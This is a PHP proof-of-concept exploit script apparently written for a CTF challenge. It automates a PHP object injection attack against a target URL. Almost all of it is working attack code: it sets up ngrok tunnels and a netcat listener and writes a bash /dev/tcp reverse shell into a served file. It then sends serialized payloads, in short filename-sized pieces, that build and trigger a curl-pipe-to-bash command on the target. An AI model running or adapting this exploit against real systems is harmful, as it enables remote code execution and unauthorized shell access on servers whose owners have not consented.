<?php

class MySink
{

    private $command = false;

    public function __construct($cmd)   
    {
        $this->command = $cmd;
    }

    public function __wakeup()
    {
        if (strlen($this->command) > 4) {
            $this->command = false;
        }
    }

    public function __destruct()    
    {
        if (strlen($this->command) > 4) {
            $this->command = false;
        }
        if ($this->command) {
            /* echo "success\r\n"; */
            /* echo $this->command . "\r\n"; */
        }
    }
}

$url = 'https://php-strikes.hack10.procuniten.com/index.php?code='; // CHANGE TO TARGET URL/PARAMETER



print "=======================================================================================================\r\n";
print " \r\n";
print "		   PHP Object Injection PoC Exploit by Mohin Paramasivam (Shad0wQu35t) 			  \r\n";
print "			         https://www.linkedin.com/in/mohinparamasivam		  \r\n";
print " 		                 https://github.com/mohinparamasivam					  \r\n";
print "																					\r\n";
print " 			        HACK@10 PHP STRIKE BACK CTF CHALLENGE 						  \r\n";
print "																					\r\n";
print "=======================================================================================================\r\n";

$sleep_time = 2000000;

print "\r\n";


print "[+] Installing Dependencies (Grab a coffee might take a while :) )\r\n";
system("rm ngrok*");
system("wget -q https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.tgz && tar -xvf ngrok-stable-linux-amd64.tgz");
system("apt-get -qq install -y gnome-terminal && apt-get -qq install -y python3 && apt-get -qq install -y jq && apt-get -qq install -y bash && apt-get -qq install -y curl");


print "Enter ngrok authtoken (https://dashboard.ngrok.com/get-started/your-authtoken) : ";
$ngrok_authtoken = rtrim(fgets(STDIN));
print "\r\n";


print "Enter HTTP Port to Listen : ";
$http_port = rtrim(fgets(STDIN));
print "\r\n";

print "Enter Reverse Shell Listening Port : ";
$rev_port = rtrim(fgets(STDIN));
print "\r\n";


system("./ngrok authtoken $ngrok_authtoken");
print"Starting ngrok TCP & HTTP Forwarder...[OK] \r\n";
usleep($sleep_time);
system('gnome-terminal -x sh -c \'./ngrok http \''.$http_port);
system('gnome-terminal -x sh -c \'./ngrok tcp --region=ap \''.$rev_port);
usleep(10000000);

//get ip address for http and tcp from ngrok api


$http_url_ngrok = system("curl --silent http://127.0.0.1:4040/api/tunnels | jq '.tunnels[0].public_url'");

$tcp_url_ngrok = system("curl --silent http://127.0.0.1:4041/api/tunnels | jq '.tunnels[0].public_url'");

//remove the tcp and http header from the urls

$http_url_ngrok_trimmed = substr($http_url_ngrok,9);
$tcp_url_ngrok_trimmed = str_replace('"',"",str_replace(':', '/',substr($tcp_url_ngrok,7)));
//$tcp_url_ngrok_trimmed2 = substr($tcp_url_ngrok_trimmed1, 0, -3);

print "\r\n";

print "Generating Reverse Shell File index.html...[OK]\r\n";
system("rm index.html");
$shellfile = fopen("index.html", "w") or die("Unable to open file!");
$rev_shell = "/bin/bash -c 'bash -i >& /dev/tcp/$tcp_url_ngrok_trimmed 0>&1'
";
fwrite($shellfile,$rev_shell);
fclose($shellfile);


print"Starting Python HTTP Server...[OK]\r\n";
system('gnome-terminal -x sh -c \'python3 -m http.server \''.$http_port);

print "Starting Reverse Shell Listener...[OK]\r\n";
system('gnome-terminal -x sh -c \'nc -lvp \''.$rev_port);


print "[+] Generating serialized payload...[OK]\r\n";





#create a file called g with ls -th > g

$stage1 = ">sl";
$stage2 = ">ht-";
$stage3 = ">g\>";
$stage4 = ">dir";
$stage5 = "*>v";
$stage6 = ">rev";
$stage7 = "*v>x";


/* #send our malicious payload to be triggered */

$payload1 = ">sh;";
$payload2 = ">ba\\";
$payload3 = ">\|\\";
$payload4 = ">$http_url_ngrok_trimmed[25]$http_url_ngrok_trimmed[26]\\";
$payload5 = ">$http_url_ngrok_trimmed[23]$http_url_ngrok_trimmed[24]\\";
$payload6 = ">$http_url_ngrok_trimmed[21]$http_url_ngrok_trimmed[22]\\";
$payload7 = ">$http_url_ngrok_trimmed[19]$http_url_ngrok_trimmed[20]\\";
$payload8 = ">$http_url_ngrok_trimmed[17]$http_url_ngrok_trimmed[18]\\";
$payload9 = ">$http_url_ngrok_trimmed[15]$http_url_ngrok_trimmed[16]\\";
$payload10 = ">$http_url_ngrok_trimmed[13]$http_url_ngrok_trimmed[14]\\";
$payload11 = ">$http_url_ngrok_trimmed[11]$http_url_ngrok_trimmed[12]\\";
$payload12 = ">$http_url_ngrok_trimmed[9]$http_url_ngrok_trimmed[10]\\";
$payload13 = ">$http_url_ngrok_trimmed[7]$http_url_ngrok_trimmed[8]\\";
$payload14 = ">$http_url_ngrok_trimmed[5]$http_url_ngrok_trimmed[6]\\";
$payload15 = ">$http_url_ngrok_trimmed[3]$http_url_ngrok_trimmed[4]\\";
$payload16 = ">$http_url_ngrok_trimmed[1]$http_url_ngrok_trimmed[2]\\";
$payload17 = ">$http_url_ngrok_trimmed[0]\\";
$payload18 = ">\ \\";
$payload19 = ">rl\\";
$payload20 = ">cu\\";


$shell1 = "sh x";
$shell2 = "sh g";

$sleep_time = 2000;

print "[+] Sending exploit...[OK]\r\n";

print " [+] Preparing Stager ...[OK]\r\n";


# remove all files and folder in the path in order for payload to work

$destruct_url = 'https://php-strikes.hack10.procuniten.com/index.php?clear=yes';
$response_destruct = file_get_contents("$destruct_url");
usleep($sleep_time);

$url_stage1 = $url . urlencode(base64_encode(serialize(new MySink($stage1))));
$response_stage1 = file_get_contents("$url_stage1");
usleep($sleep_time);

$url_stage2 = $url . urlencode(base64_encode(serialize(new MySink($stage2))));
$response_stage2 = file_get_contents("$url_stage2");
usleep($sleep_time);

$url_stage3 = $url . urlencode(base64_encode(serialize(new MySink($stage3))));
$response_stage3 = file_get_contents("$url_stage3");
usleep($sleep_time);

$url_stage4 = $url . urlencode(base64_encode(serialize(new MySink($stage4))));
$response_stage4 = file_get_contents("$url_stage4");
usleep($sleep_time);

$url_stage5 = $url . urlencode(base64_encode(serialize(new MySink($stage5))));
$response_stage5 = file_get_contents("$url_stage5");
usleep($sleep_time);

$url_stage6 = $url . urlencode(base64_encode(serialize(new MySink($stage6))));
$response_stage6 = file_get_contents("$url_stage6");
usleep($sleep_time);

$url_stage7 = $url . urlencode(base64_encode(serialize(new MySink($stage7))));
$response_stage7 = file_get_contents("$url_stage7");
usleep($sleep_time);


print " [+] Stager Completed  ...[OK]\r\n";

print " [+] Sending Payload ...[OK]\r\n";


$url_payload1 = $url . urlencode(base64_encode(serialize(new MySink($payload1))));
$response_payload1 = file_get_contents("$url_payload1");
usleep($sleep_time);

$url_payload2 = $url . urlencode(base64_encode(serialize(new MySink($payload2))));
$response_payload2 = file_get_contents("$url_payload2");
usleep($sleep_time);

$url_payload3 = $url . urlencode(base64_encode(serialize(new MySink($payload3))));
$response_payload3 = file_get_contents("$url_payload3");
usleep($sleep_time);

$url_payload4 = $url . urlencode(base64_encode(serialize(new MySink($payload4))));
$response_payload4 = file_get_contents("$url_payload4");
usleep($sleep_time);

$url_payload5 = $url . urlencode(base64_encode(serialize(new MySink($payload5))));
$response_payload5 = file_get_contents("$url_payload5");
usleep($sleep_time);

$url_payload6 = $url . urlencode(base64_encode(serialize(new MySink($payload6))));
$response_payload6 = file_get_contents("$url_payload6");
usleep($sleep_time);

$url_payload7 = $url . urlencode(base64_encode(serialize(new MySink($payload7))));
$response_payload7 = file_get_contents("$url_payload7");
usleep($sleep_time);

$url_payload8 = $url . urlencode(base64_encode(serialize(new MySink($payload8))));
$response_payload8 = file_get_contents("$url_payload8");
usleep($sleep_time);

$url_payload9 = $url . urlencode(base64_encode(serialize(new MySink($payload9))));
$response_payload9 = file_get_contents("$url_payload9");
usleep($sleep_time);

$url_payload10 = $url . urlencode(base64_encode(serialize(new MySink($payload10))));
$response_payload10 = file_get_contents("$url_payload10");
usleep($sleep_time);

$url_payload11 = $url . urlencode(base64_encode(serialize(new MySink($payload11))));
$response_payload11 = file_get_contents("$url_payload11");
usleep($sleep_time);

$url_payload12 = $url . urlencode(base64_encode(serialize(new MySink($payload12))));
$response_payload12 = file_get_contents("$url_payload12");
usleep($sleep_time);

$url_payload13 = $url . urlencode(base64_encode(serialize(new MySink($payload13))));
$response_payload13 = file_get_contents("$url_payload13");
usleep($sleep_time);

$url_payload14 = $url . urlencode(base64_encode(serialize(new MySink($payload14))));
$response_payload14 = file_get_contents("$url_payload14");
usleep($sleep_time);

$url_payload15 = $url . urlencode(base64_encode(serialize(new MySink($payload15))));
$response_payload15 = file_get_contents("$url_payload15");
usleep($sleep_time);

$url_payload16 = $url . urlencode(base64_encode(serialize(new MySink($payload16))));
$response_payload16 = file_get_contents("$url_payload16");
usleep($sleep_time);

$url_payload17 = $url . urlencode(base64_encode(serialize(new MySink($payload17))));
$response_payload17 = file_get_contents("$url_payload17");
usleep($sleep_time);

$url_payload18 = $url . urlencode(base64_encode(serialize(new MySink($payload18))));
$response_payload18 = file_get_contents("$url_payload18");
usleep($sleep_time);

$url_payload19 = $url . urlencode(base64_encode(serialize(new MySink($payload19))));
$response_payload19 = file_get_contents("$url_payload19");
usleep($sleep_time);

$url_payload20 = $url . urlencode(base64_encode(serialize(new MySink($payload20))));
$response_payload20 = file_get_contents("$url_payload20");
usleep($sleep_time);


print " [+] Triggering Payload ...[OK]\r\n";

$url_shell1 = $url . urlencode(base64_encode(serialize(new MySink($shell1))));
$response = file_get_contents("$url_shell1");
echo $response;
usleep($sleep_time);

$url_shell2 = $url . urlencode(base64_encode(serialize(new MySink($shell2))));
$response = file_get_contents("$url_shell2");
echo $response;
usleep($sleep_time);



print " [+] Exploit Success w00t w00t :) ...[OK]\r\n";

print "[+] Dropping down to interactive shell...[OK]\r\n";
print "[+' Check Netcat Listener !!!\r\n";
print "==============================================================================\r\n";




?>